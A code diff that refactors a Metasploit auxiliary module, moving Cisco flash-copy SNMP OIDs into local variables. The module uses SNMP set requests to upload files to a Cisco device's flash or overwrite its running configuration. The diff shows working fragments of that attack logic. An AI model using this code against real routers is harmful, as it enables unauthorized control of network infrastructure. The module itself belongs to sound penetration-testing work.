@@ -31,20 +31,16 @@ class MetasploitModule < Msf::Auxiliary
             'Upload_File',
             {
               'Description'                   => 'Upload the file',
-              'ciscoFlashCopyCommand'         => '1.3.6.1.4.1.9.9.10.1.2.1.1.2.',
               'ciscoFlashCopyProtocol'        => '1.3.6.1.4.1.9.9.10.1.2.1.1.3.',
               'ciscoFlashCopyServerAddress'   => '1.3.6.1.4.1.9.9.10.1.2.1.1.4.',
               'ciscoFlashCopySourceName'      => '1.3.6.1.4.1.9.9.10.1.2.1.1.5.',
               'ciscoFlashCopyDestinationName' => '1.3.6.1.4.1.9.9.10.1.2.1.1.6.',
-              'ciscoFlashCopyEntryStatus'     => '1.3.6.1.4.1.9.9.10.1.2.1.1.11.'
             }
           ],
           [
             'Override_Config',
             {
               'Description'                   => 'Override the running config',
-              'ciscoFlashCopyEntryStatus'     => '1.3.6.1.4.1.9.9.10.1.2.1.1.11.',
-              'ciscoFlashCopyCommand'         => '1.3.6.1.4.1.9.9.10.1.2.1.1.2.',
               'ccCopyProtocol'                => '1.3.6.1.4.1.9.9.96.1.1.1.1.2.',
               'ccCopySourceFileType'          => '1.3.6.1.4.1.9.9.96.1.1.1.1.3.',
               'ccCopyDestFileType'            => '1.3.6.1.4.1.9.9.96.1.1.1.1.4.',
@@ -114,13 +110,17 @@ class MetasploitModule < Msf::Auxiliary
 
       snmp = connect_snmp
 
-      varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyEntryStatus']}#{session}" , SNMP::Integer.new(6))
+      # OID variables to for checking if the host is alive and if the community is valid
+      ciscoFlashCopyEntryStatus = '1.3.6.1.4.1.9.9.10.1.2.1.1.11.'
+      ciscoFlashCopyCommand = '1.3.6.1.4.1.9.9.10.1.2.1.1.2.'
+
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(6))
       value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyEntryStatus']}#{session}" , SNMP::Integer.new(5))
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(5))
       value = snmp.set(varbind)
 
-      varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyCommand']}#{session}" , SNMP::Integer.new(2))
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}" , SNMP::Integer.new(2))
       value = snmp.set(varbind)
 
 
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
         varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyDestinationName']}#{session}", SNMP::OctetString.new(@filename))
         value = snmp.set(varbind)
 
-        varbind = SNMP::VarBind.new("#{action.opts['ciscoFlashCopyEntryStatus']}#{session}" , SNMP::Integer.new(1))
+        varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
         value = snmp.set(varbind)
 
       elsif(action.name == 'Override_Config')
